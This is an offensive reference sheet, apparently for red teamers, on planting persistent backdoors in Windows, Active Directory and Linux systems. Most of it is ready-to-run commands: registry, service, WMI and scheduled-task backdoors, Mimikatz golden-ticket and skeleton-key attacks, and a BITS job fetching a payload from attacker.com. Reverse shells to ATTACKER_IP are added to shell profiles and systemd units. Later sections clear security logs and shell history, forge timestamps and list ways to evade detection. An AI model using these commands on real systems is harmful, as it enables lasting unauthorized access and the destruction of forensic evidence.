# Persistence Techniques Reference

> *"Access gained is access maintained. Design persistence like an architect."*

## Windows Persistence

### User-Level Persistence

#### Registry Run Keys
```powershell
# HKCU Run (current user, at login)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"

# HKCU RunOnce (runs once, then deleted)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"

# PowerShell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\path\to\backdoor.exe"
```

#### Startup Folder
```powershell
# User startup folder
copy backdoor.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# Location
# C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

#### Logon Scripts
```powershell
# Via registry
reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\path\to\script.bat"
```

### Admin-Level Persistence

#### HKLM Run Keys
```powershell
# All users, at login
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"
```

#### All Users Startup Folder
```powershell
copy backdoor.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

#### Scheduled Tasks
```powershell
# At logon
schtasks /create /sc onlogon /tn "SystemUpdate" /tr "C:\path\to\backdoor.exe" /ru SYSTEM

# At startup
schtasks /create /sc onstart /tn "SystemUpdate" /tr "C:\path\to\backdoor.exe" /ru SYSTEM

# Every X minutes
schtasks /create /sc minute /mo 15 /tn "SystemUpdate" /tr "C:\path\to\backdoor.exe"

# Daily at specific time
schtasks /create /sc daily /st 09:00 /tn "SystemUpdate" /tr "C:\path\to\backdoor.exe"

# On idle
schtasks /create /sc onidle /i 10 /tn "SystemUpdate" /tr "C:\path\to\backdoor.exe"

# PowerShell
$action = New-ScheduledTaskAction -Execute "C:\path\to\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemUpdate" -User "SYSTEM"
```

#### Windows Services
```powershell
# Create service
sc create Backdoor binPath= "C:\path\to\backdoor.exe" start= auto DisplayName= "Windows Update Service"
sc description Backdoor "Provides automatic Windows updates"
sc start Backdoor

# Using sc.exe with account
sc create Backdoor binPath= "C:\path\to\backdoor.exe" start= auto obj= "LocalSystem"

# PowerShell
New-Service -Name "Backdoor" -BinaryPathName "C:\path\to\backdoor.exe" -StartupType Automatic
Start-Service -Name "Backdoor"
```

#### WMI Event Subscriptions
```powershell
# Create persistent WMI backdoor
$FilterArgs = @{
    Name = 'SystemFilter'
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"
}
$Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{
    Name = 'SystemConsumer'
    CommandLineTemplate = "C:\path\to\backdoor.exe"
}
$Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$BindingArgs = @{
    Filter = [Ref]$Filter
    Consumer = [Ref]$Consumer
}
New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $BindingArgs
```

#### Winlogon
```powershell
# Shell replacement
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\path\to\backdoor.exe"

# Userinit
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe, C:\path\to\backdoor.exe"
```

### Advanced Persistence

#### DLL Search Order Hijacking
```powershell
# Target application that loads missing DLL
# Place malicious DLL in:
# 1. Application directory
# 2. System32
# 3. Windows directory
# 4. PATH directories

# Create proxy DLL that forwards to original
```

#### COM Object Hijacking
```powershell
# Find hijackable CLSIDs
# Target InprocServer32 entries

reg add "HKCU\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\path\to\malicious.dll"
reg add "HKCU\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment"
```

#### AppInit_DLLs
```powershell
# Loads DLL into every process using user32.dll
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\path\to\malicious.dll"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1
```

#### Netsh Helper DLL
```powershell
# Register helper DLL
netsh add helper C:\path\to\malicious.dll
```

#### BITS Jobs
```powershell
# Background Intelligent Transfer Service
bitsadmin /create backdoor
bitsadmin /addfile backdoor http://attacker.com/payload.exe C:\path\to\payload.exe
bitsadmin /SetNotifyCmdLine backdoor C:\path\to\payload.exe NULL
bitsadmin /SetMinRetryDelay backdoor 60
bitsadmin /resume backdoor
```

### Domain Persistence

#### Golden Ticket
```powershell
# Requires krbtgt hash
# Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Valid for 10 years by default
# Survives password resets (until krbtgt changed twice)
```

#### Silver Ticket
```powershell
# Requires service account hash
# Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:HASH /ptt
```

#### Skeleton Key
```powershell
# Inject into LSASS on DC
# Mimikatz on DC
privilege::debug
misc::skeleton

# Now "mimikatz" password works for any user
```

#### DSRM Backdoor
```powershell
# Directory Services Restore Mode
# Modify registry to allow DSRM admin logon
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DSRMAdminLogonBehavior /t REG_DWORD /d 2
```

#### AdminSDHolder
```powershell
# ACL backdoor on AdminSDHolder container
# Propagates to protected groups every 60 minutes
# Add ACE granting full control to your user
```

## Linux Persistence

### User-Level Persistence

#### SSH Authorized Keys
```bash
# Add your public key
echo "ssh-rsa AAAA... attacker@host" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
```

#### Cron Jobs
```bash
# User crontab
crontab -e
# Add: * * * * * /tmp/backdoor.sh

# Or directly
(crontab -l; echo "* * * * * /tmp/backdoor.sh") | crontab -
```

#### Shell Profiles
```bash
# .bashrc (bash login)
echo 'nohup bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> ~/.bashrc

# .bash_profile (bash login shell)
echo 'nohup bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> ~/.bash_profile

# .profile (sh/bash)
echo 'nohup bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> ~/.profile

# .zshrc (zsh)
echo 'nohup zsh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> ~/.zshrc
```

#### Shell Aliases
```bash
# Add malicious alias
echo 'alias sudo="sudo /tmp/backdoor.sh; sudo"' >> ~/.bashrc
echo 'alias ls="ls --color=auto; /tmp/backdoor.sh"' >> ~/.bashrc
```

### Root-Level Persistence

#### System Cron
```bash
# /etc/crontab
echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab

# /etc/cron.d/
echo "* * * * * root /tmp/backdoor.sh" > /etc/cron.d/backdoor
chmod 644 /etc/cron.d/backdoor
```

#### Systemd Service
```bash
# Create service file
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service
```

#### Systemd Timer
```bash
# Service file
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service

[Service]
Type=oneshot
ExecStart=/tmp/backdoor.sh
EOF

# Timer file
cat > /etc/systemd/system/backdoor.timer << EOF
[Unit]
Description=Run backdoor every minute

[Timer]
OnCalendar=*:*:00
Persistent=true

[Install]
WantedBy=timers.target
EOF

systemctl daemon-reload
systemctl enable backdoor.timer
systemctl start backdoor.timer
```

#### Init Scripts (SysV)
```bash
# /etc/init.d/backdoor
#!/bin/bash
/tmp/backdoor.sh &

chmod +x /etc/init.d/backdoor
update-rc.d backdoor defaults
```

#### rc.local
```bash
# /etc/rc.local (if exists and executable)
echo '/tmp/backdoor.sh &' >> /etc/rc.local
chmod +x /etc/rc.local
```

#### MOTD
```bash
# /etc/update-motd.d/ (Ubuntu/Debian)
cat > /etc/update-motd.d/99-backdoor << EOF
#!/bin/bash
/tmp/backdoor.sh &
EOF
chmod +x /etc/update-motd.d/99-backdoor
```

### Advanced Persistence

#### SUID Backdoor
```bash
# Copy bash with SUID
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden

# Access
/tmp/.hidden -p
```

#### Kernel Module (Rootkit)
```c
// Simple LKM backdoor
#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void) {
    // Backdoor code here
    return 0;
}

void cleanup_module(void) {}

MODULE_LICENSE("GPL");
```

#### PAM Backdoor
```bash
# Modify pam_unix.so to accept backdoor password
# Requires recompiling PAM module
# High complexity, high detection risk
```

#### LD_PRELOAD Persistence
```bash
# Create malicious shared library
# Add to /etc/ld.so.preload
echo "/path/to/malicious.so" >> /etc/ld.so.preload

# Loads into every process
```

#### Xinetd/Inetd Service
```bash
# /etc/xinetd.d/backdoor
service backdoor
{
    disable     = no
    socket_type = stream
    protocol    = tcp
    port        = 9999
    wait        = no
    user        = root
    server      = /bin/bash
    server_args = -i
}
```

## Cleanup Considerations

### Windows Cleanup
```powershell
# Remove scheduled task
schtasks /delete /tn "TaskName" /f

# Remove service
sc delete ServiceName

# Remove registry keys
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /f

# Remove files
del C:\path\to\backdoor.exe

# Clear event logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```

### Linux Cleanup
```bash
# Remove cron job
crontab -r  # Remove all
crontab -l | grep -v 'backdoor' | crontab -  # Remove specific

# Remove systemd service
systemctl stop backdoor
systemctl disable backdoor
rm /etc/systemd/system/backdoor.service
systemctl daemon-reload

# Remove files
rm /tmp/backdoor.sh
rm ~/.ssh/authorized_keys  # Or remove specific line

# Clear history
history -c
cat /dev/null > ~/.bash_history

# Clear logs
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
```

## Detection Avoidance Tips

### General Principles
```
1. Blend in with legitimate system activity
2. Use common names for backdoors
3. Match file timestamps with surrounding files
4. Avoid noisy network callbacks
5. Use legitimate protocols (HTTP/HTTPS)
6. Obfuscate payloads
7. Multiple persistence mechanisms
8. Different privilege levels
```

### Timestamp Manipulation
```bash
# Linux - match timestamp
touch -r /bin/ls /tmp/backdoor

# Windows
$file = Get-Item C:\path\to\backdoor.exe
$file.LastWriteTime = Get-Item C:\Windows\explorer.exe | Select -ExpandProperty LastWriteTime
```
